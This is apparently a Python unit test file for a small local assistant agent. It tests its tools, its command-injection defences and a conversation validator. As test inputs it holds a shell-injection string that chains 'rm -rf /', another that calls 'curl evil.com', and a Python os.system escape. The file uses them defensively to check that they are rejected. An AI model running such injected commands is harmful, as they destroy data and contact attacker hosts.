"""
runtime/test_agent.py
Comprehensive automated test suite for SmolLM2 Fedora Agent:
- Tool execution unit tests
- Subprocess command injection security tests
- Schema checker & canonicalizer tests
- Loss masking logic unit tests
"""

import unittest
from runtime.tools import (
    calculator,
    user_memory,
    system_health,
    system_action,
    reminder,
    _safe_kill,
)
from validator.schema_checker import validate_conversation, validate_tool_call
from validator.canonicalizer import canonicalize_conversation
from generator.schemas import CANONICAL_SYSTEM_PROMPT

class TestTools(unittest.TestCase):
    def test_calculator(self):
        self.assertEqual(calculator("120 * 0.15"), "18.0")
        self.assertEqual(calculator("(45 + 78) * 2"), "246")
        self.assertTrue("Error" in calculator("__import__('os').system('ls')"))

    def test_user_memory(self):
        store_res = user_memory("store", "test_key", "test_val")
        self.assertIn("stored", store_res)
        get_res = user_memory("get", "test_key")
        self.assertIn("test_val", get_res)
        del_res = user_memory("delete", "test_key")
        self.assertIn("deleted", del_res)

    def test_system_health(self):
        cpu_res = system_health("cpu")
        self.assertIn("CPU", cpu_res)
        ram_res = system_health("ram")
        self.assertIn("RAM", ram_res)
        disk_res = system_health("disk")
        self.assertIn("Disk", disk_res)
        all_res = system_health("all")
        self.assertIn("System Overview", all_res)

    def test_system_action_datetime(self):
        res = system_action("get_datetime")
        self.assertRegex(res, r"\d{4}-\d{2}-\d{2}")

    def test_command_injection_mitigation(self):
        # Attempt malicious shell injection payload
        res = _safe_kill("firefox; rm -rf /")
        self.assertIn("Error", res)
        
        res2 = _safe_kill("app && curl evil.com")
        self.assertIn("Error", res2)

    def test_reminder_dispatch(self):
        res = reminder("Unit test task", "10s")
        self.assertIn("scheduled in background", res)

class TestValidationAndCanonicalization(unittest.TestCase):
    def test_valid_conversation_passes(self):
        valid_conv = {
            "messages": [
                {"role": "system", "content": CANONICAL_SYSTEM_PROMPT},
                {"role": "user", "content": "Check my RAM usage."},
                {"role": "assistant", "content": '<thought>User asks for RAM.</thought>\n<tool_call>{"name": "system_health", "arguments": {"target": "ram"}}</tool_call>'},
                {"role": "tool", "content": "RAM: 6.2GB / 16GB used."},
                {"role": "assistant", "content": "Your RAM usage is at 6.2GB out of 16GB total."}
            ]
        }
        is_valid, reason = validate_conversation(valid_conv)
        self.assertTrue(is_valid, f"Expected valid, failed with: {reason}")

    def test_hallucinated_tool_rejected(self):
        invalid_conv = {
            "messages": [
                {"role": "system", "content": CANONICAL_SYSTEM_PROMPT},
                {"role": "user", "content": "Open terminal."},
                {"role": "assistant", "content": '<thought>Run bash.</thought>\n<tool_call>{"name": "bash_terminal", "arguments": {"cmd": "ls"}}</tool_call>'}
            ]
        }
        is_valid, reason = validate_conversation(invalid_conv)
        self.assertFalse(is_valid)
        self.assertIn("Hallucinated tool", reason)

    def test_consecutive_assistant_turns_rejected(self):
        invalid_conv = {
            "messages": [
                {"role": "system", "content": CANONICAL_SYSTEM_PROMPT},
                {"role": "assistant", "content": "Hello!"},
                {"role": "assistant", "content": "How can I help?"}
            ]
        }
        is_valid, reason = validate_conversation(invalid_conv)
        self.assertFalse(is_valid)
        self.assertIn("consecutive assistant turns", reason)

    def test_canonicalizer_cleans_markdown_and_serializes(self):
        raw_conv = {
            "messages": [
                {"role": "system", "content": CANONICAL_SYSTEM_PROMPT},
                {"role": "assistant", "content": '<thought> Check cpu </thought>\n<tool_call>\n```json\n{"name": "system_health", "arguments": {"target": "cpu"}}\n```\n</tool_call>'}
            ]
        }
        cleaned = canonicalize_conversation(raw_conv)
        self.assertIsNotNone(cleaned)
        asst_msg = cleaned["messages"][1]["content"]
        self.assertIn('<tool_call>{"name":"system_health","arguments":{"target":"cpu"}}</tool_call>', asst_msg)

if __name__ == "__main__":
    unittest.main()
